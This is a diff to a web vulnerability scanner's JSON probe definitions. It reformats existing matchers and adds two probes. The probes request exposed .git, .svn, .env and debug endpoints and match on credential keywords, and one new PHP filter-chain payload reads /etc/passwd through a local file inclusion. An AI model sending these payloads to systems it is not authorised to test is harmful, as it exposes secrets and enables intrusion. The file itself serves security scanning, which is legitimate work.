@@ -10,8 +10,19 @@
           "payload": "/.git/HEAD",
           "description": "Git HEAD file -- if accessible, contains current branch ref confirming .git directory is exposed. Use git-dumper to extract full repo.",
           "matchers": [
-            {"type": "word", "words": ["ref: refs/heads/", "ref: refs/"]},
-            {"type": "status", "status": [200]}
+            {
+              "type": "word",
+              "words": [
+                "ref: refs/heads/",
+                "ref: refs/"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 70
@@ -20,8 +31,21 @@
           "payload": "/.git/config",
           "description": "Git config -- contains remote URL (may include credentials), author info, branch tracking. Often blocked but .git/HEAD is not.",
           "matchers": [
-            {"type": "word", "words": ["[core]", "[remote", "repositoryformatversion"], "condition": "or"},
-            {"type": "status", "status": [200]}
+            {
+              "type": "word",
+              "words": [
+                "[core]",
+                "[remote",
+                "repositoryformatversion"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 75
@@ -30,15 +54,28 @@
     },
     "svn_exposure": {
       "description": "Exposed .svn directory -- download Subversion metadata including source code and credentials",
-      "tech_match": ["Apache"],
+      "tech_match": [
+        "Apache"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "/.svn/entries",
           "description": "SVN entries file (pre-1.7) -- contains file listing and revision info of the working copy",
           "matchers": [
-            {"type": "word", "words": ["dir", "svn:"]},
-            {"type": "status", "status": [200]}
+            {
+              "type": "word",
+              "words": [
+                "dir",
+                "svn:"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 65
@@ -47,8 +84,18 @@
           "payload": "/.svn/wc.db",
           "description": "SVN SQLite database (1.7+) -- contains full working copy metadata including file paths and checksums",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "words": ["SQLite"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "SQLite"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 65
@@ -64,8 +111,24 @@
           "payload": "/.env",
           "description": ".env file -- contains environment variables (DB passwords, API keys, secret keys). Most critical file to check.",
           "matchers": [
-            {"type": "word", "words": ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL", "AWS_", "REDIS_"], "condition": "or"},
-            {"type": "status", "status": [200]}
+            {
+              "type": "word",
+              "words": [
+                "DB_PASSWORD",
+                "SECRET_KEY",
+                "API_KEY",
+                "DATABASE_URL",
+                "AWS_",
+                "REDIS_"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 80
@@ -74,8 +137,23 @@
           "payload": "/.env.backup",
           "description": ".env.backup -- backup copy of .env file, often with production credentials",
           "matchers": [
-            {"type": "word", "words": ["DB_", "SECRET", "KEY", "PASSWORD", "TOKEN"], "condition": "or"},
-            {"type": "status", "status": [200]}
+            {
+              "type": "word",
+              "words": [
+                "DB_",
+                "SECRET",
+                "KEY",
+                "PASSWORD",
+                "TOKEN"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 75
@@ -84,15 +162,35 @@
     },
     "debug_endpoints": {
       "description": "Exposed debug/admin endpoints -- Spring Actuator, Django debug, PHP info pages leaking configuration",
-      "tech_match": ["Spring", "Django", "PHP", "Laravel", "Rails"],
+      "tech_match": [
+        "Spring",
+        "Django",
+        "PHP",
+        "Laravel",
+        "Rails"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "/actuator/env",
           "description": "Spring Actuator environment -- dumps all environment properties including database credentials and secrets",
           "matchers": [
-            {"type": "word", "words": ["spring.", "server.port", "database", "datasource"], "condition": "or"},
-            {"type": "status", "status": [200]}
+            {
+              "type": "word",
+              "words": [
+                "spring.",
+                "server.port",
+                "database",
+                "datasource"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 75
@@ -101,11 +199,86 @@
           "payload": "/debug/vars",
           "description": "Go expvar debug endpoint -- exposes internal variables and runtime stats",
           "matchers": [
-            {"type": "word", "words": ["memstats", "cmdline", "goroutine"], "condition": "or"},
-            {"type": "status", "status": [200]}
+            {
+              "type": "word",
+              "words": [
+                "memstats",
+                "cmdline",
+                "goroutine"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 60
+        }
+      ]
+    },
+    "git_index_binary_magic": {
+      "description": ".git/index binary file disclosed. Highest-confidence .git/ exposure marker — DIRC binary magic rules out HTML 404 returning 200.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "GET /.git/index — DIRC\\x00 magic confirms genuine git index, not HTML soft-404",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "pattern": "^DIRC\\x00\\x00\\x00[2-4]"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 75,
+          "variables": {
+            "path_override": "/.git/index"
+          }
+        }
+      ]
+    },
+    "php_filter_chain_lfi": {
+      "description": "PHP filter chain LFI → RCE (Synacktiv). Encodes arbitrary bytes via iconv/base64 filter cascade to bypass safe-include allowlist.",
+      "tech_match": [
+        "php"
+      ],
+      "param_match": [
+        "file",
+        "path",
+        "include",
+        "page",
+        "template"
+      ],
+      "probes": [
+        {
+          "payload": "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode/resource=/etc/passwd",
+          "description": "Filter chain reads /etc/passwd through iconv+base64 cascade — base64 fragment confirms read",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "[A-Za-z0-9+/]{200,}={0,2}"
+            },
+            {
+              "type": "length_delta",
+              "min_delta": 200
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     }
